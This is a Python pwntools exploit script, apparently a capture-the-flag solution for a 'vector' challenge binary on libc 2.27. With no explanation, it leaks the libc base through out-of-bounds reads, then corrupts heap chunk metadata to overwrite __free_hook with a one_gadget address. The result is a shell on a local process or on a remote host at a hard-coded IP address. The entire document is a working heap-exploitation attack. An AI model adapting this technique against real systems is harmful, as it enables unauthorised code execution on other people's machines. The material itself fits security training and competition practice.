#!/usr/bin/env python
from pwn import *

def new(name):
    s.sendlineafter('> ', '1')
    s.sendlineafter('name: ', str(name))

def concat(name1, name2, name):
    s.sendlineafter('> ', '2')
    s.sendlineafter('name: ', str(name1))
    s.sendlineafter('name: ', str(name2))
    s.sendlineafter('name: ', str(name))

def push(name, value):
    s.sendlineafter('> ', '3')
    s.sendlineafter('name: ', str(name))
    s.sendlineafter('value: ', str(value))

def set(name, index, value):
    s.sendlineafter('> ', '4')
    s.sendlineafter('name: ', str(name))
    s.sendlineafter('index: ', str(index))
    s.sendlineafter('value: ', str(value))

def get(name, index):
    s.sendlineafter('> ', '5')
    s.sendlineafter('name: ', str(name))
    s.sendlineafter('index: ', str(index))
    s.recvuntil('val: ')
    return int(s.recvline(False))

if len(sys.argv) == 1:
    s = process('./vector', env = {'LD_PRELOAD': './libc-2.27.so'})
else:
    s = remote('34.97.74.235', 30001)

libc = ELF('./libc-2.27.so')

new(0)
push(0, 0)
for _ in range(11):
    concat(0, 0, 0)
push(0, 1)
libc_base = 0
for i in range(6):
    libc_base += (get(0, i+4) & 0xff) << i * 8
libc_base -= 0x3ebca0
log.info('libc base: %#x' % libc_base)

for i in range(1, 7):
    new(i)
push(4, 0)
for _ in range(6):
    concat(4, 4, 4)
push(3, 0)
for _ in range(5):
    concat(3, 3, 3)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
for i, b in enumerate(p64(libc_base + one_gadgets[1])):
    set(4, i, ord(b))
push(5, 0)
set(0, 0x54, 0x71)
set(0, 0x5c, 0x68)
set(0, 0x5e, 0x68)
push(6, 0)
for i, b in enumerate(p64(libc_base + libc.symbols['__free_hook'] - 0x4)):
    set(0, 0x5c + i, ord(b))
concat(4, 3, 7)
concat(4, 3, 8)
new(0)
s.interactive()
